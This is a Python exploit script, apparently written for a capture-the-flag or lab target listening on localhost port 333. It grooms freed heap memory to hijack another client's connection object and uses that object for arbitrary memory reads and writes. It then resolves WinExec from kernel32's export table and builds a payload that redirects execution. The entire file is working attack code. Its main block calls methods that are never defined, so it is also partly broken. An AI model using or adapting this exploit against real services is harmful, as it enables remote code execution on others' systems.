from my_agent import *
import struct

STRUCT_ADDR = 0x96581c
KERNEL32_ADDRESS = 0x76c00000
WINEXEC_OFFSET = 0x5dab0
BEEP_OFFSET = 0x31940
SHELLCODE = b"\x31\xc0\xbb\xea\x1b\xe6\x77\x66\xb8\x88\x13\x50\xff\xd3"

def craft_shellcode(address, newaddr):
    addr = struct.pack("<I", address + 4)
    newaddr = struct.pack("<I", newaddr)
    shellcode = (addr + newaddr).ljust(64, b"\x00")
    return shellcode

def get_function_address(m, func_name):
    pe_sig_rva = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + 0x3c, 4))[0]
    export_table_rva = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + pe_sig_rva + 0x78, 4))[0]
    num_of_functions = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + export_table_rva + 0x14, 4))[0]
    address_table_rva = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + export_table_rva + 0x1c, 4))[0]
    name_table_rva = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + export_table_rva + 0x20, 4))[0]
    ordinal_table_rva = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + export_table_rva + 0x24, 4))[0]

    for x in range(KERNEL32_ADDRESS + name_table_rva, KERNEL32_ADDRESS + name_table_rva + num_of_functions*4, 4):
        name_address = struct.unpack("<I", m.read_from_address(x, 4))[0]
        name = m.read_from_address(KERNEL32_ADDRESS + name_address, 64)
        name = name[:name.find(b"\x00")]
        if func_name == name:
            func_index = int((x - KERNEL32_ADDRESS - name_table_rva)/4)
            break

    func_ordinal = struct.unpack("<H", m.read_from_address(KERNEL32_ADDRESS + ordinal_table_rva + 2*func_index, 2))[0]

    func_address = struct.unpack("<I", m.read_from_address(KERNEL32_ADDRESS + address_table_rva + 4*func_ordinal, 4))[0]

    return func_address + KERNEL32_ADDRESS

class MaliciousAgent(object):
    def __init__(self):
        self.reconnect()
        self.create_controlled_connection()

    def reconnect(self):
        self.agent = pythonAgent(("127.0.0.1", 333))
        self.agent.connect(b"a"*24)

    def free(self):
        self.agent.put_new_name(b"b"*100)

    def is_controlling_conn(self, victim):
        name = self.agent.read_name()[1]
        addr = struct.unpack("<I", name[:4])[0]

        if name != "a"*24:
            if addr == STRUCT_ADDR:
                return True
            else:
                self.reconnect()
        
        return False

    def close(self):
        self.agent.close()

    def create_controlled_connection(self):
        while True:
            self.free()

            self.victim = pythonAgent(("127.0.0.1", 333))
            self.victim.connect(b"a"*64)

            if self.is_controlling_conn(self.victim):
                break

    def get_victim_obj(self):
        return self.agent.read_name()[1]

    def set_victim_obj(self, obj):
        self.agent.put_new_name(obj)

    def get_victim_user_address(self):
        victim_obj = self.get_victim_obj()
        return struct.unpack("<I", victim_obj[20:])[0]

    def set_victim_user_address(self, address):
        victim_obj = self.get_victim_obj()
        new_victim_obj = victim_obj[:20] + struct.pack("<I", address) 

        self.set_victim_obj(new_victim_obj)

    def read_from_stack(self):
        victim_obj = self.get_victim_obj()
        new_victim_obj = victim_obj[:16] + struct.pack("<I", 2000) + victim_obj[20:]
        self.set_victim_obj(new_victim_obj)
        return self.victim.read_name()[1]

    def _write_to_address(self, address, data):
        assert len(data) <= 64, "Can only write up to 64 bytes at a time"
        self.set_victim_user_address(address)
        self.victim.put_new_name(data)

    def _read_from_address(self, address, amount=64):
        assert amount <= 64, "Can only read up to 64 bytes at a time"
        self.set_victim_user_address(address)
        return self.victim.read_name()[1][:amount]

    def read_from_address(self, address, amount=64):
        output = b""

        try:
            for x in range(0, amount, 64):
                shet = self._read_from_address(address + x, 64)
                # print("", address + x*64, shet)
                output += shet
        except:
            print("Error: server probably crashed :(")

        return output[:amount]

    def write_to_address(self, address, data):
        assert len(data) % 64 == 0
        for x in range(0, len(data), 64):
            print("writing 64 bytes to {}".format(address + x))
            self._write_to_address(address + x, data[x: x+64])

    def run_address(self, address):
        victim_obj = self.get_victim_obj()
        victim_user_addr = self.get_victim_user_address()

        new_victim_obj = victim_obj[20:] + victim_obj[4:]

        self.victim.put_new_name(craft_shellcode(victim_user_addr, address))

        self.set_victim_obj(new_victim_obj)

        self.victim.send_message_to_server(b"test")


if __name__ == "__main__":
    m = MaliciousAgent()
    victim = m.control_new_conn_obj()

    m.exploit(victim)

            
